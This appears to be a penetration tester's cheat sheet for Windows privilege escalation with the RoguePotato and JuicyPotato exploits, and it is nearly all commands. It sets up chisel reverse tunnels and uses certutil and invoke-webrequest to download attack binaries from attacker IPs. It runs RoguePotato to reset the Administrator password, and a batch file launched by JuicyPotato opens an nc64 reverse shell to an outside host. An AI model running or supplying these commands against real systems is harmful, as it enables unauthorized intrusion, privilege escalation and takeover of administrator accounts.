# Potatoes

setup chisel - server and client

```
# ON KALI
sudo ./chisel server -p 9001 --reverse
sudo socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999

# ON WINDOWS
invoke-webrequest -uri 'http://192.168.49.74:53/chisel.exe' -outfile c.exe
certutil.exe -urlcache -split -f "http://192.168.49.74:53/chisel.exe" c.exe

# we do this and open up port 9999 on windows, after this if you see the port
# 9999 open from KALI, you dont need chisel, but if you are not able to connect
# back to windows from KALI on 9999, you need chisel which will help you in doing
# exactly the same, forward KALI:9999 ==> WINDOWS:9999
.\c.exe client 192.168.49.74:9001 R:9999:127.0.0.1:9999
```

download rogue potato to the windows box

```
# ON WINDOWS
invoke-webrequest -uri 'http://10.10.14.64:81/RoguePotato.exe' -outfile .\rp.exe
certutil.exe -urlcache -split -f "http://192.168.49.74:53/RoguePotato.exe" .\rp.exe

# change admin password and then RunAs Administrator
.\rp.exe -r 192.168.49.74 -e "cmd /c \"net user administrator administrator123456\"" -l 9999
```

### Juicy Potato

```
.\jp.exe -t * -p "C:\users\destitute\desktop\run.bat" -l 9999 -c '{8BC3F05E-D86B-11D0-A075-00C04FB68820}'

PS C:\users\destitute\desktop> type run.bat
C:\users\destitute\desktop\nc64.exe 10.10.14.28 4243 -e cmd.exe
```
